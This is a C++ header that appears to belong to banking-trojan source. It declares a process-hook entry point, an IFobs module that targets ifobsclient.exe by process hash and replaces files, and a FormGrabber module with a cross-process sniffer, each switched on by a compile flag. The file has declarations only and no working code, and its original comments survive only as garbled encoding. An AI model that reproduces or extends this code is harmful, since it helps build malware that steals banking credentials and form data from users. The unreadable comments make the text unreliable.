#include "../../core/include/core/type.h"
#include "../../core/include/core/memory.h"
#pragma once
//��������� �������

namespace System
{

//hash - ��� �������� (nameProcess), nameProcess - ��� ��������, path - ����� ��� ��������� nameProcess
void Start( uint hash, StringBuilder& nameProcess, StringBuilder& path );

}

#ifdef ON_IFOBS

namespace IFobs
{

const int HASH_PROCESS = 0x0fcd41c5; // ifobsclient.exe
extern char* nameProcess;

void Start( uint hash, StringBuilder& nameProcess, StringBuilder& path );
//���������� �� ������� ifobs (task.cpp)
void CreateFileReplacing( StringBuilder& s );

}

#endif

#ifdef ON_FORMGRABBER

namespace FormGrabber
{

void Start( uint hash, StringBuilder& nameProcess, StringBuilder& path );
//������ ���� �������� ����� �������
void StartCrossSniffer();

}

#endif
